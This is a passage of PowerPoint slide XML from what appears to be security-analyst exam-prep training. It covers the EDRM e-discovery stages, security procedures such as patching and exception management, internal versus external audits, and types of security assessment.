                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Preservation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Collection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Processing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Review</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Production</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Presentation</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847</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>EDRM Model (Electronic Discovery Reference Model)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The Electronic Discovery Reference Model (EDRM) is a standardized nine-stage framework for handling electronically stored information (ESI) during legal e-discovery, running from information governance through identification (locating potential sources of ESI and scoping its breadth and depth), preservation (protecting ESI from inappropriate alteration or destruction), and collection (gathering it for further use).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The later stages are processing (reducing volume and converting ESI to review-ready forms), review (evaluating for relevance and privilege), analysis (evaluating content and context such as key patterns, topics, and people), production (delivering ESI to others in appropriate forms and mechanisms), and presentation (displaying ESI to audiences at depositions, hearings, or trials to elicit information or persuade).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a security analyst the early stages matter most, because identification, preservation, and collection must protect integrity and chain of custody so the evidence remains defensible and admissible in later legal proceedings.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect to place the EDRM phases in order or match a described activity (preserving data from deletion, culling volume before review) to its stage.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848</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>EDRM Model (Electronic Discovery Reference Model)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Identification – Locating potential sources of ESI &amp; determining its scope, breadth &amp; depth.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Preservation – Ensuring that ESI is protected against inappropriate alteration or destruction.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Collection – Gathering ESI for further use in the e-discovery process (processing, review, etc.).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Processing – Reducing the volume of ESI and converting it, if necessary, to forms more suitable for review &amp; analysis.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849</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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EDRM Model (Electronic Discovery Reference Model)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Review – Evaluating ESI for relevance &amp; privilege.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysis – Evaluating ESI for content &amp; context, including key patterns, topics, people &amp; discussion.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Production– Delivering ESI to others in appropriate forms &amp; using appropriate delivery mechanisms.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850</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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EDRM Model (Electronic Discovery Reference Model) (3)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Presentation– Displaying ESI before audiences (at depositions, hearings, trials, etc.), especially in native &amp; near-native forms, to elicit further information, validate existing facts or positions, or persuade an audience.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851</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Procedures Overview (3)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Continuous monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Evidence production</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Patching</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Identify and fix vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Tasks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Identification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Application</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Validation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Documentation</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852</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Procedures Overview (4)</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Continuous monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Evidence production</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Patching</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Compensating control development</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Alternative control to substitute for control that’s too costly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Control testing procedure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Ensure the control won’t break the system</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853</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Procedures Overview (5)</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Continuous monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Evidence production</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Patching</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Compensating control development</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Control testing procedures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Exception management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  How to decide on compensating or technical controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Who granted the exception? Trace back for audit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Process for exception determination</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854</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Procedures Overview (6)</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Continuous monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Evidence production</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Patching</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Compensating control development</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Control testing procedures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Exception management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Remediation plans</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Plan B</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855</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Procedures Overview (7)</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Audits</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Assessments &amp; evaluations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Maturity models</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Certification</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856</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Audits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An audit is a formal inspection of a system's or organization's compliance against a defined policy, standard, or regulation, producing an objective record of whether required controls are actually in place and operating.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An external audit is conducted by an independent third party and is typically guided by regulatory compliance requirements such as PCI DSS, HIPAA, or SOC 2, giving results credibility because the auditor has no stake in the outcome, while an internal audit is performed by the organization's own auditors but should still be guided by those same regulatory requirements.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts support audits by supplying evidence such as logs, configurations, and vulnerability reports, and audit findings often become the driver for remediation work and control improvements.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Know the distinction between internal and external audits and that independence is what gives an external audit its assurance value for regulators and customers.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857</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Audits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Inspection of a system’s compliance to a policy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  External audit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Conducted by independent 3rd party</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Guided by regulatory compliance requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Internal audit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Internal auditors should also be guided by regulatory compliance requirements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858</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Audits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g_bf3e57cf98.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2354929" y="1783080"/>
            <a:ext cx="7479094" cy="4434840"/>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859</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Evaluations &amp; Assessments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Evaluations and assessments are the range of activities used to measure security posture and gather exhaustive information on vulnerabilities, including vulnerability assessments (scanning to enumerate weaknesses), penetration tests (actively exploiting them), red team assessments (adversary-emulation against defenses), risk assessments, threat modeling, and tabletop exercises that walk stakeholders through a scenario.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Their combined output tells the organization about open vulnerabilities, remediated vulnerabilities, and vulnerability trends across the network, so that reporting can show whether the security program is improving or falling behind over time.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts use these results to prioritize remediation and to communicate risk to management, since trending data (are we closing findings faster than new ones appear?) is far more persuasive than a single raw scan count.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam expects you to distinguish these assessment types by scope and intent (vulnerability assessment vs. pen test vs. red team) and to interpret metrics like open vs. remediated findings and trends.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860</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Evaluations &amp; Assessments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Vulnerability assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Penetration test</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
